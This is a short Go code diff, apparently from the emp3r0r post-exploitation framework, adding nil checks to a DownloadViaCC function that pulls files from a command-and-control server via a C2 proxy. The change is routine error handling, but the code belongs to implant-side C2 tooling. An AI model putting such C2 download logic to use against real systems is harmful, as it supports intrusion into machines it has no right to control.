@@ -70,6 +70,10 @@ func DownloadViaCC(file_to_download, path string) (data []byte, err error) {
 	// use EmpHTTPClient if no path specified
 	if retData {
 		client := tun.EmpHTTPClient(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
+		if client == nil {
+			err = fmt.Errorf("failed to initialize HTTP client")
+			return
+		}
 		req, err := http.NewRequest("GET", url, nil)
 		if err != nil {
 			err = fmt.Errorf("DownloadViaCC HTTP GET failed to create request: %v", err)
@@ -97,6 +101,10 @@ func DownloadViaCC(file_to_download, path string) (data []byte, err error) {
 	// use grab
 	client := grab.NewClient()
 	client.HTTPClient = tun.EmpHTTPClient(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
+	if client.HTTPClient == nil {
+		err = fmt.Errorf("failed to initialize HTTP client")
+		return
+	}
 
 	req, err := grab.NewRequest(path, url)
 	if err != nil {
